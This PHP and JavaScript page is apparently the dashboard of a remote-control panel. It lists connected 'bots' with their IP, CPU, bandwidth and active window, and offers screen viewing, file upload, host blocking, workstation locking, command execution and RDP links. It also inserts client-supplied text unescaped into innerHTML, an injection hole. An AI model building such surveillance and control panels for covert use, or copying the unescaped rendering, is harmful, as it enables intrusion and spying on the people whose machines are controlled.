<?php
 session_start();
 if(!isset($_SESSION['logged'])){header("Location:login.php");exit();}
 include'header.php';
 include 'upUi.php';
 include 'hostsUi.php';


?>

	<center>
  <table id="clients" class="table-dark table-hover table-bordered bg-black" style="width:95%;font-size: 23px;">
  <thead>
    <tr>
      
      <th class="titles" scope="col">Name</th>
	  <th class="titles" scope="col">IP</th>
      <th class="titles" scope="col">Bandwith usage(Mbps)</th>
      <th class="titles" scope="col">CPU usage</th>
      <th class="titles" scope="col">Active Window</th>
	  <th class="titles" scope="col">Status</th>
	  <th class="titles" scope="col">User Status</th>
	  <th class="titles" scope="col">Action</th>
    </tr>
  </thead>
  <tbody>
    
    </tbody>
</table>

</center>




</html>

<script>




function updateTable() {
	var actionUpload="openModal('botid','botname','myModal')";
	var actionBlock="openModal('botid','botname','hostsModal')";
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function () {
        if (xhr.readyState === 4 && xhr.status === 200) {
            // Parse JSON
            var jsonData = JSON.parse(xhr.responseText);

            var tableBody = document.getElementById("clients").getElementsByTagName('tbody')[0];

            tableBody.innerHTML = "";
            for (var i = 0; i < jsonData.length; i++) {
                var row = tableBody.insertRow(-1);
                var name = row.insertCell(0);
                var ip = row.insertCell(1);
				var bandwith = row.insertCell(2);
				var cpu = row.insertCell(3);
				var activewindow = row.insertCell(4);
				var status = row.insertCell(5);
				var userstatus = row.insertCell(6);
				var action = row.insertCell(7);
				
				
				var cpuint = parseFloat(jsonData[i].currentcpu);
				if(cpuint>60){cpu.style.color = "red";}
                
                name.innerHTML = jsonData[i].name;
                ip.innerHTML = jsonData[i].ip;
				bandwith.innerHTML = "<img src='img/dwn.png' />"+jsonData[i].currentbandrec+"<img src='img/up.png' />"+jsonData[i].currentbandsent;
				
				let cpufloat = parseFloat(jsonData[i].currentcpu);
				cpufloat = cpufloat.toFixed(2);
				
				
				
				cpu.innerHTML = cpufloat.toString()+"%";
				activewindow.innerHTML = jsonData[i].window;
				//status.innerHTML = jsonData[i].status;
				 
				 if(jsonData[i].status==0){status.innerHTML ='<span class="badge badge-success">Unlocked</span>';}
				 else {status.innerHTML ='<span class="badge badge-danger">Locked</span>';}
				 
				if(jsonData[i].user_status=="0"){userstatus.innerHTML ='<span class="badge badge-success">Active</span>';}
				else {userstatus.innerHTML ='<span class="badge badge-danger">Idle</span>';}
				
				var actionup=actionUpload.replace("botid",jsonData[i].id);
				actionup=actionup.replace("botname",jsonData[i].name);
				
				var actionblockhost=actionBlock.replace("botname",jsonData[i].name);
				actionblockhost=actionblockhost.replace("botid",jsonData[i].id);
				action.innerHTML='<a target="_blank" href="Screen/ScreenViewer.php?id='+jsonData[i].id+'">Screen</a>&nbsp;&nbsp;&nbsp;'+ '<a href="javascript:void(0);" onclick="'+actionup+'">FileUpload</a>'+'<a href="javascript:void(0);" onclick="'+actionblockhost+'">&nbsp;&nbsp;&nbsp;BlockHosts</a>'+   '<a href="javascript:void(0);" onclick=screenLock("'+jsonData[i].id+'")>&nbsp;&nbsp;&nbsp;LockWorkstation</a>'+'<a href="javascript:void(0);" onclick=screenUnlock("'+jsonData[i].id+'")>&nbsp;&nbsp;&nbsp;UnlockWorstation</a>'+'<a  href="command.php?id='+jsonData[i].id+'&admin">&nbsp;&nbsp;&nbsp;Command&nbsp;&nbsp;</a><a target="_blank" href="RDP.php?id='+jsonData[i].id+'">&nbsp;&nbsp;&nbsp;RDP&nbsp;&nbsp;&nbsp;</a>';
				
            }
        }
    };
    xhr.open("GET", "clients.php", true);
    xhr.send();
}
updateTable();
setInterval(updateTable, 3000);
</script>
<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.10.2/dist/umd/popper.min.js"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>